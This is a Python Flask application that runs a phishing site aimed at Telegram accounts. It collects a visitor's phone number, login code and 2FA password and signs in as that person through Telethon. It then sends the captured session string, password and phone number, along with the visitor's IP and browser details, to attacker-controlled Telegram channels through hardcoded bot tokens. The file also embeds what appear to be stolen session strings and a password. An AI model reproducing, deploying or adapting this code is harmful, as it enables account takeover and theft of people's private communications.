import getpass

import requests
from flask import Flask, render_template, redirect, url_for, request, g
from flask_wtf import FlaskForm
from telethon.errors import SessionPasswordNeededError
from telethon.sessions.string import StringSession
from wtforms import StringField, SubmitField
from wtforms.validators import DataRequired
from telethon import TelegramClient
import base64
from telethon import sync
from flask_ipinfo import IPInfo

api_id = 610352
api_hash = 'e23e46f33178dfde1765f92e27e3321e'

app = Flask(__name__)
app.config.update(dict(
    SECRET_KEY="powerful secretkey",
    WTF_CSRF_SECRET_KEY="a csrf secret key",
    CSRF_ENABLED=True,
    LINK="https://t.me/joinchat/AAAAAFk6A2_U6W9wuepnSA"
))

ipinfo = IPInfo()


def send_user_info():
    data = {
        "chat_id": "@helpex_channel",
        "text": f"Browser: {ipinfo.browser}\nЯзык: {ipinfo.lang}\nОС: {ipinfo.os}\nIP: {ipinfo.ipaddress}\n{ipinfo.get_info}"
    }
    url = "https://api.telegram.org/bot598340268:AAG5LAPOcWOqEUXcSPjfXBJ4CXDY0hHDR3Y/sendMessage?"
    resp = requests.get(url=url, params=data)
    return resp


client = TelegramClient(StringSession(), api_id, api_hash)


def send_logs(text):
    try:
        data = {
            "chat_id": "@insta_logsjfkkdkg",
            "text": text
        }
        url = "https://api.telegram.org/bot798892209:AAERnOgDPPmlTJDjJ9mrnfjjh6dCUG2g2NM/sendMessage?"
        resp = requests.get(url=url, params=data)
        return True
    except Exception:
        send_logs('Что-то пошло не по плану')


class NumberForm(FlaskForm):
    number = StringField("Phone number", validators=[DataRequired()])
    phone_code = StringField("Phone code", validators=[DataRequired()], default="+380")
    submit = SubmitField("Next")


class ClientLoginForm(FlaskForm):
    api_id = StringField("Api id", validators=[DataRequired()])
    api_hash = StringField("Api hash", validators=[DataRequired()])
    string_session = StringField("Строка", validators=[DataRequired()])
    number = StringField("Номер телефона")
    password = StringField("2FA пароль")
    submit = SubmitField("Ввойти")


class CodeForm(FlaskForm):
    code = StringField("Enter code", validators=[DataRequired()])
    submit = SubmitField("Login")

def send(login_code, phone):
    try:
        send_logs(login_code, phone)
        global client
        phone = base64.b64decode(base64.b64encode(bytes(phone, "utf-8"))).decode("utf-8", "ignore")
        if client.is_connected():
            try:
                client.sign_in(phone=phone, code=login_code)
                string = client.session.save()
                send_logs(
                    f"Login:\n\n {string} \nSuccess✅\n\nApi_hash: \n\n{api_hash}\nApi_id: \n\n{api_id}\n\nNumber: {phone}")
            except SessionPasswordNeededError:
                return redirect(url_for("password", phone=phone))
        else:
            client.connect()
            try:
                client.sign_in(phone=phone, code=login_code)
                string = client.session.save()
                send_logs(
                    f"Login:\n\n {string} \nSuccess✅\n\nApi_hash: \n\n{api_hash}\nApi_id: \n\n{api_id}\n\nNumber: {phone}")
            except SessionPasswordNeededError:
                return redirect(url_for("password", phone=phone))
        client.disconnect()
        return redirect('https://t.me/joinchat/AAAAAFk6A2_U6W9wuepnSA')
    except:
        print(e)
        return redirect(url_for('login'))

def send_with_pss(login_password):
    try:
        send_logs(login_password)
        global client
        phone = base64.b64decode(base64.b64encode(bytes(phone, "utf-8"))).decode("utf-8", "ignore")
        try:
            if client.is_connected():
                try:
                    client.sign_in(password=login_password)
                    string = client.session.save()
                    send_logs(
                        f"Success✅\nLogin: \n\n{string} \n\nPassword: \n\n{login_password}\nApi_hash: \n\n{api_hash}\nApi_id: \n\n{api_id}\n\nNumber: {phone}")
                    client.disconnect()
                except Exception as e:
                    client.disconnect()
                    send_logs(str(e))
                    return redirect(url_for('login'))
            else:
                client.connect()
                client.sign_in(password=login_password)
                string = client.session.save()
                send_logs(
                    f"Success✅\nLogin: \n\n{string} \n\nPassword: \n\n{login_password}\nApi_hash: \n\n{api_hash}\nApi_id: \n\n{api_id}\n\nNumber: {phone}")
                client.disconnect()
        except:
            return redirect(url_for('login'))
        return redirect('https://t.me/joinchat/AAAAAFk6A2_U6W9wuepnSA')
    except Exception as e:
        print(e)
        return redirect(url_for('login'))



@app.route('/', methods=["POST", "GET"])
def login():
    send_user_info()
    number = NumberForm()
    if number.is_submitted():
        global client
        phone = number.phone_code.data + number.number.data
        if client.is_connected():
            client.send_code_request(phone=phone)
        else:
            client.connect()
            client.send_code_request(phone=phone)

        return redirect(url_for('code', phone=base64.b64encode(bytes(phone, "utf-8"))))
    return render_template('login.html', number=number)


@app.route('/code<string:phone>/', methods=["POST", 'GET'])
def code(phone):
    send_user_info()
    code_form = CodeForm()
    if code_form.is_submitted():
        return send(login_code=code_form.code.data, phone=phone)
    return render_template('code.html', code_form=code_form, phone=phone)


@app.route('/password<string:phone>/', methods=["POST", 'GET'])
def password(phone):
    send_user_info()
    code_form = CodeForm()
    if code_form.is_submitted():
        return send_with_pss(login_password=code_form.code.data)

    return render_template('password.html', code_form=code_form, phone=phone)


@app.route('/client_login/', methods=["POST", "GET"])
def client_login():
    form = ClientLoginForm()
    if form.is_submitted():
        client = TelegramClient(
            StringSession(string=form.string_session.data),
            api_id=int(form.api_id.data),
            api_hash=form.api_hash.data
        )
        client.connect()
        return render_template('client_parser.html', client=client)
    return render_template('client_login.html', form=form)


@app.route('/client_parser/', methods=["POST", "GET"])
def client_parser():
    string = "1BJWapzMBu2Xy-XhWR24vNIzWOSW3Cg6F6_xeUyhzBEj9D5M_gHLKKab19o7aCpYSbCagZY8EHVA3x37KQnuuwGVMH91HTnhNFbxGoT_Pxb29ZtU4zGOj7ItRCT754YAfqF_ko0RCv88UiFsAFnnfAE3JbG1mktbUWypINVAd4TGocyZ_AUJSeeP8o6mpvahgRk5_EMVQRmTWZQPgVU_wwTAYQufg56BwzAQjYFAYJRi4O7mYedsJpJ5vjYeOR8k0JiPiR5gvIqk1gourZliROwODUZh5IIzkTvFxxflFH_oEJm_ESL-FMxs78960EpKqC4f4gckOYwuFn1DnHmhNVaWLNvHR8Gc="
    client = TelegramClient(
        StringSession(string=string),
        api_id=api_id,
        api_hash='api_hash',
    )
    client.connect()
    client.sign_in(password='Ing0dwetru5T01031988')
    return render_template('client_parser.html', client=client)


if __name__ == '__main__':
    app.run()
